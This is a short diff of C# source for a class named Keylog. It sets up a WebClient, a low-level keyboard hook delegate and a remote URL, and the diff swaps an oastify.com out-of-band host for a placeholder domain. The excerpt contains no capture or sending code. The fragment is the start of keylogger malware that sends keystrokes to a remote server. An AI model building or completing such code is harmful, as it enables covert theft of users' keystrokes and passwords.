@@ -6,7 +6,7 @@ using System.Net;
 
 public class Keylog
 {
-    private static string webRequestUrl = "https://b7j2lxhbihvzej9yxyv4ir4twk2bqbe0.oastify.com";
+    private static string webRequestUrl = "https://xxxxxxxx.com";
     private static WebClient webClient = new WebClient();
 
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
